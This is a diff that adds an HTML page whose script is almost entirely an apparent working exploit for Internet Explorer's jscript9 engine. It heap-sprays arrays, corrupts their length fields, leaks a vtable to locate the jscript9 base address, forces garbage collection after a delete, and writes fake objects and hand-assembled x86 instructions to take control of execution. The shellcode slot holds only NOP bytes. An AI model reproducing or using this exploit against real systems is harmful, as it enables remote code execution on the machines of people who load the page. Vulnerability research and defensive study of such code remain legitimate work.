@@ -1,0 +1,66 @@
+<html>
+    <body>
+        <script>
+            function exp()
+            {
+                var array_1 = new Array();
+                var size = 0x1000 * 0x100;
+                for(var i=0; i<size; i+=1)
+                {
+                    array_1[i] = new Array(1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1);
+                }
+                for(var i=size-2;i>0;i--)
+                {
+                    array_1[i][22] = 0x7fffffff;
+                    array_1[i][29] = 0x7fffffff;
+                    array_1[i][30] = 0x7fffffff;
+                    if(array_1[i+1].length == 0x7fffffff)
+                    {
+                        var array_vft_address = array_1[i+1][18];
+                        var jscript9_base_addr = array_vft_address - 0x00004534;
+                        var shell_code = "\u9090\u9090";
+                        delete array_1[i + 3];
+                        CollectGarbage();
+                        var new_obj = new Array(shell_code,shell_code,shell_code,shell_code,
+                        shell_code,shell_code,shell_code,shell_code,
+                        shell_code,shell_code,shell_code,shell_code,
+                        shell_code,shell_code,shell_code,shell_code,
+                        shell_code,shell_code,shell_code,shell_code,
+                        shell_code,shell_code,shell_code,shell_code,
+                        shell_code,shell_code,shell_code,shell_code);
+                        array_1[i][0] = jscript9_base_addr + 0x00143BA1;
+                        array_1[i][1] = 0x0c0c0000;
+                        array_1[i][4] = 0x0c0c0000;
+                        array_1[i+1][18] = 0x0c0bffbc;
+                        0x0c0c003c in (array_1[i + 2]);
+                        array_1[i][0] = 0x0c0c003c;
+
+                        //get bstr address
+                        //A1 90010C0C   mov eax,dword ptr ds:[0xC0C0190]
+                        //83C0 0C       add eax,0xC
+                        //8B18          mov ebx,dword ptr ds:[eax]
+                        //8BC3          mov eax,ebx
+                        //A3 B8000C0C   mov dword ptr ds:[0xC0C00B8],eax
+                        //C2 0400       retn 0x4
+                        array_1[i][1] = 0x0c0190a1;
+                        array_1[i][2] = 0x0cc0830c;
+                        array_1[i][3] = 0x4646188b;
+                        array_1[i][4] = 0x4646c38b;
+                        array_1[i][5] = 0x0c00b8a3;
+                        array_1[i][6] = 0x0004c20c;
+                        0x0c0c003c in (array_1[i + 2]);
+                        var bstr_addr = array_1[i + 1][0];
+                        array_1[i][0] = jscript9_base_addr + 0x00143BA1;
+                        array_1[i][1] = 0x0c0c0000;
+                        array_1[i][4] = bstr_addr-2;
+                        array_1[i+1][18] = 0x0c0bffbc;
+                        0x0c0c003c in (array_1[i + 2]);
+                        array_1[i][0] = bstr_addr;
+                        0x0c0c003c in (array_1[i + 2]);
+                        break;
+                    }
+                }
+            }
+        </script>
+    </body>
+</html>
